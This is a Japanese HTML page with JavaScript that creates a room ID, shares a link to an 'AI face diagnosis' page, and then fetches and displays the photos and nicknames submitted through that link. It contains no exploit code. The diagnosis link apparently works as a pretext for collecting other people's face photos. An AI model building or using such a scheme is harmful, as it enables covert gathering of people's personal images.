```html
<!DOCTYPE html>
<html lang="ja">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>写真受信</title>

<style>
* {
  box-sizing: border-box;
}

body {
  margin: 0;
  padding: 20px;
  font-family: sans-serif;
  background: #111827;
  color: white;
}

.container {
  max-width: 600px;
  margin: auto;
}

button {
  width: 100%;
  padding: 16px;
  margin-top: 12px;
  border: 0;
  border-radius: 12px;
  background: #4f46e5;
  color: white;
  font-size: 17px;
  font-weight: bold;
}

input {
  width: 100%;
  padding: 14px;
  margin-top: 10px;
  border: 0;
  border-radius: 10px;
  font-size: 16px;
}

.card {
  margin-top: 20px;
  padding: 15px;
  background: #1f2937;
  border-radius: 16px;
}

.card img {
  width: 100%;
  margin-top: 12px;
  border-radius: 12px;
}

.room {
  padding: 12px;
  margin-top: 15px;
  background: #374151;
  border-radius: 10px;
  word-break: break-all;
}

.error {
  margin-top: 15px;
  padding: 12px;
  background: #7f1d1d;
  border-radius: 10px;
  white-space: pre-wrap;
}
</style>
</head>

<body>

<div class="container">

<h1>📷 写真受信</h1>

<button
  id="createButton"
  type="button"
>
🔗 リンクを作成
</button>

<div id="roomArea" class="room" style="display:none;">

<strong>あなたのルームID</strong>

<p id="roomText"></p>

</div>

<button
  id="copyButton"
  type="button"
  style="display:none;"
>
📋 診断リンクをコピー
</button>

<button
  id="openButton"
  type="button"
  style="display:none;"
>
🔗 診断ページを開く
</button>

<button
  id="checkButton"
  type="button"
  style="display:none;"
>
📷 写真を確認
</button>

<div id="error" class="error" style="display:none;"></div>

<div id="photos"></div>

</div>


<script>

const PHOTO_RECEIVER_URL =
"https://crdvhjtoxqeuttrnhfhj.supabase.co/functions/v1/photo-receiver";

const DIAGNOSIS_URL =
"https://gaffney16445.github.io/ai-face-diagnosis/";


let currentRoom =
localStorage.getItem("receiverRoom") || "";

let diagnosisLink = "";


const createButton =
document.getElementById("createButton");

const roomArea =
document.getElementById("roomArea");

const roomText =
document.getElementById("roomText");

const copyButton =
document.getElementById("copyButton");

const openButton =
document.getElementById("openButton");

const checkButton =
document.getElementById("checkButton");

const photos =
document.getElementById("photos");

const error =
document.getElementById("error");


/* ルームID作成 */

function createRoomId() {

  const chars =
  "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

  let result = "";

  for (let i = 0; i < 12; i++) {

    result +=
    chars[
      Math.floor(
        Math.random() *
        chars.length
      )
    ];

  }

  return result;

}


/* リンク作成 */

createButton.addEventListener(
"click",
() => {

  currentRoom =
  createRoomId();

  localStorage.setItem(
    "receiverRoom",
    currentRoom
  );

  diagnosisLink =
  DIAGNOSIS_URL +
  "?room=" +
  encodeURIComponent(
    currentRoom
  );


  roomText.textContent =
  currentRoom;

  roomArea.style.display =
  "block";

  copyButton.style.display =
  "block";

  openButton.style.display =
  "block";

  checkButton.style.display =
  "block";

});


/* コピー */

copyButton.addEventListener(
"click",
async () => {

  if (!diagnosisLink) return;

  try {

    await navigator.clipboard.writeText(
      diagnosisLink
    );

    alert(
      "診断リンクをコピーしました！"
    );

  } catch {

    alert(
      diagnosisLink
    );

  }

});


/* 診断ページを開く */

openButton.addEventListener(
"click",
() => {

  if (diagnosisLink) {

    window.open(
      diagnosisLink,
      "_blank"
    );

  }

});


/* 写真確認 */

checkButton.addEventListener(
"click",
async () => {

  if (!currentRoom) {

    alert(
      "先に「リンクを作成」を押してください。"
    );

    return;

  }

  error.style.display =
  "none";

  photos.innerHTML =
  "<p>写真を読み込んでいます…</p>";


  try {

    const response =
    await fetch(
      PHOTO_RECEIVER_URL +
      "?room=" +
      encodeURIComponent(
        currentRoom
      )
    );

    const data =
    await response.json();


    if (!response.ok || !data.success) {

      throw new Error(
        data.error ||
        "写真一覧を取得できませんでした"
      );

    }


    photos.innerHTML = "";


    if (
      !data.photos ||
      data.photos.length === 0
    ) {

      photos.innerHTML =
      "<div class='card'>" +
      "まだ写真は届いていません。" +
      "</div>";

      return;

    }


    data.photos.forEach(
      (item, index) => {

        const card =
        document.createElement(
          "div"
        );

        card.className =
        "card";


        const title =
        document.createElement(
          "h2"
        );

        title.textContent =
        "📷 写真 " +
        (index + 1);


        const name =
        document.createElement(
          "p"
        );

        name.textContent =
        "👤 " +
        (
          item.nickname ||
          "名前なし"
        ) +
        " さん";


        const image =
        document.createElement(
          "img"
        );

        image.src =
        item.url;

        image.alt =
        (
          item.nickname ||
          "名前なし"
        ) +
        " さんの写真";


        card.appendChild(
          title
        );

        card.appendChild(
          name
        );

        card.appendChild(
          image
        );

        photos.appendChild(
          card
        );

      }
    );


  } catch (err) {

    console.error(err);

    photos.innerHTML =
    "";

    error.textContent =
    "エラー：\n" +
    err.message;

    error.style.display =
    "block";

  }

});


/* 前回のルームを復元 */

if (currentRoom) {

  diagnosisLink =
  DIAGNOSIS_URL +
  "?room=" +
  encodeURIComponent(
    currentRoom
  );

  roomText.textContent =
  currentRoom;

  roomArea.style.display =
  "block";

  copyButton.style.display =
  "block";

  openButton.style.display =
  "block";

  checkButton.style.display =
  "block";

}

</script>

</body>
</html>
```
